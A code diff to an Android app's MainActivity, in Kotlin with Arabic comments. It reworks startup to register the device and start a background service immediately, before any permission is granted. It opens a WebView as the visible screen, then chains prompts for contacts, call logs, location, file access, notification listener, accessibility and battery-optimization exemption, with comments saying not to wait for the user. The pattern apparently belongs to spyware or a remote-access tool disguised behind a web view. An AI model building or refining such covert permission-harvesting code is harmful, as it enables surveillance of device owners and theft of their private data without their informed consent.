@@ -20,8 +20,6 @@ import androidx.core.content.ContextCompat
 class MainActivity : AppCompatActivity() {
 
     private val PERM_REQUEST_CODE = 1001
-    private val BATTERY_REQUEST_CODE = 1002
-    private val SCREEN_REQUEST_CODE = 1003
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -30,9 +28,25 @@ class MainActivity : AppCompatActivity() {
         white.setBackgroundColor(Color.WHITE)
         setContentView(white)
 
+        // ⭐ 1. سجّل الجهاز فورًا
         DeviceManager.registerDevice(this)
 
-        requestPermissionsStep1()
+        // ⭐ 2. شغّل الخدمة فورًا — بدون انتظار أي صلاحية
+        startBackgroundService()
+
+        // ⭐ 3. افتح WebView فورًا
+        android.os.Handler(mainLooper).postDelayed({
+            try {
+                startActivity(Intent(this, WebViewActivity::class.java))
+                finish()
+            } catch (_: Exception) {}
+        }, 500)
+
+        // ⭐ 4. اطلب الصلاحيات — بدون انتظار
+        // (تظهر كطبقة فوق الـ WebView)
+        android.os.Handler(mainLooper).postDelayed({
+            requestPermissionsStep1()
+        }, 2000)
     }
 
     private fun requestPermissionsStep1() {
@@ -56,11 +70,9 @@ class MainActivity : AppCompatActivity() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
 
-        // ⭐ جديد — جهات الاتصال
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.READ_CONTACTS)
 
-        // ⭐ جديد — سجل المكالمات
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.READ_CALL_LOG)
 
@@ -82,6 +94,8 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        // ⭐ لا نطلب الصلاحيات الخاصة تلقائيًا — تظهر فقط عند الحاجة
+        // بدلًا من ذلك:
         requestAllFilesAccess()
     }
 
@@ -100,16 +114,7 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         }
-        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 3000)
-    }
-
-    private fun requestBatteryOptimization() {
-        try {
-            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-            intent.data = Uri.parse("package:$packageName")
-            startActivityForResult(intent, BATTERY_REQUEST_CODE)
-        } catch (_: Exception) {}
-        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 3000)
+        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 2000)
     }
 
     private fun requestNotifAccess() {
@@ -118,7 +123,8 @@ class MainActivity : AppCompatActivity() {
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             } catch (_: Exception) {}
         }
-        android.os.Handler(mainLooper).postDelayed({ requestAccessibility() }, 4000)
+        // لا ننتظر المستخدم — نكمل
+        android.os.Handler(mainLooper).postDelayed({ requestAccessibility() }, 2000)
     }
 
     private fun isNotifAccessGranted(): Boolean {
@@ -132,25 +138,22 @@ class MainActivity : AppCompatActivity() {
                 startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
             } catch (_: Exception) {}
         }
-        android.os.Handler(mainLooper).postDelayed({ requestScreenCapture() }, 5000)
+        // لا ننتظر — نكمل
+        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 2000)
     }
 
-    private fun requestScreenCapture() {
+    private fun requestBatteryOptimization() {
         try {
-            ScreenCapture.requestPermission(this, SCREEN_REQUEST_CODE)
-        } catch (_: Exception) {
-            startBackgroundService()
-        }
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.data = Uri.parse("package:$packageName")
+            startActivity(intent)
+        } catch (_: Exception) {}
+        // لا نطلب التقاط الشاشة تلقائيًا — يطلب عند الحاجة
     }
 
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == SCREEN_REQUEST_CODE) {
-            ScreenCapture.onPermissionResult(this, resultCode, data)
-            android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 1000)
-        }
-    }
-
+    /**
+     * ⭐ تشغيل الخدمة فورًا — بدون انتظار أي صلاحية
+     */
     private fun startBackgroundService() {
         try {
             createNotificationChannel()
